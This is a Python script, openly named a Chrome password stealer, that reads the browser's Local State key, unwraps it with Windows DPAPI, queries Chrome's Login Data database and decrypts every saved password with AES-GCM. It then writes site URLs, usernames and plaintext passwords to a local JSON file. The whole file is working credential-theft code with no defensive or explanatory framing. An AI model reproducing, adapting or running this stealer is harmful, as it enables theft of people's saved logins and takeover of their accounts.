import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES

CHROME_USER_DATA_PATH = os.path.join(os.environ["USERPROFILE"], "AppData/Local/Google/Chrome/User Data")
CHROME_DB_PATH = os.path.join(CHROME_USER_DATA_PATH, "default", "Login Data")

class ChromePasswordStealer:
    """Class to retrieve and decrypt saved passwords from Chrome"""
    def get_encryption_key(self):
        """Retrieve the encryption key used to encrypt Chrome passwords."""
        local_state_path = os.path.join(CHROME_USER_DATA_PATH, "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

    def decrypt_password(self, encrypted_password, encryption_key):
        """Decrypt an encrypted password using the provided encryption key."""
        iv = encrypted_password[3:15]
        password_data = encrypted_password[15:]
        try:
            cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
            return cipher.decrypt(password_data)[:-16].decode()
        except Exception:
            return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]

    def fetch_chrome_logins(self):
        """Retrieve saved logins from Chrome's database."""
        with sqlite3.connect(CHROME_DB_PATH) as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            return cursor.fetchall()

    def save_logins_to_json(self):
        """Retrieve, decrypt, and save logins to a JSON file."""
        encryption_key = self.get_encryption_key()
        logins = self.fetch_chrome_logins()
        login_data = []
        for origin_url, username, encrypted_password in logins:
            password = self.decrypt_password(encrypted_password, encryption_key)
            if username and password:
                login_data.append({
                    "origin_url": origin_url,
                    "username": username,
                    "password": password
                })
        # Save the login data to a JSON file.
        with open("logins.json", "w", encoding="utf-8") as json_file:
            json.dump(login_data, json_file, indent=4)
        print(f"Saved {len(login_data)} logins to 'logins.json'.")

if __name__ == "__main__":
    ChromePasswordStealer().save_logins_to_json()
